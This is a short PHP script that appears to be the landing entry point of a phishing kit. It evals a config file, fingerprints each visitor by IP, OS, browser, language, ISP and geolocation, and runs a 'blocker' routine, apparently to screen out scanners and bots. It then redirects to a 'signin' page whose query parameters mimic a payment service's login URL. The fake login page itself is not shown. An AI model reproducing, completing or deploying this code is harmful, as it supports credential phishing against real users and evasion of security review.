<?php
require_once __DIR__ . '/function.php';

$api->setup();

if (file_exists($api->dir_config . '/' . $api->general_config)) {
  @eval(file_get_contents($api->dir_config . '/' . $api->general_config));
}

$_SESSION['ip']       = $api->getIp();
$_SESSION['os']       = $api->getOs();
$_SESSION['agent']    = $api->getAgent();
$_SESSION['lang']     = $api->getLang();
$_SESSION['ref']      = $api->getRef();
$_SESSION['browser']  = $api->getBrowser();
$_SESSION['key']      = $api->ngerandom();
$_SESSION['host']     = $api->getHost($_SESSION['ip']);
$_SESSION['code']     = $api->dataIP($_SESSION['ip'], "code");
$_SESSION['country']  = $api->dataIP($_SESSION['ip'], "country");
$_SESSION['city']     = $api->dataIP($_SESSION['ip'], "city");
$_SESSION['state']    = $api->dataIP($_SESSION['ip'], "state");
$_SESSION['isp']      = $api->dataIP($_SESSION['ip'], "isp");

if ($config_blocker == 1) {
  $api->create_cookie();
  $api->blocker();
  $api->session();
}

$api->redirect("signin?country.x={$_SESSION['code']}&locale.x={$_SESSION['lang']}_{$_SESSION['code']}");
?>
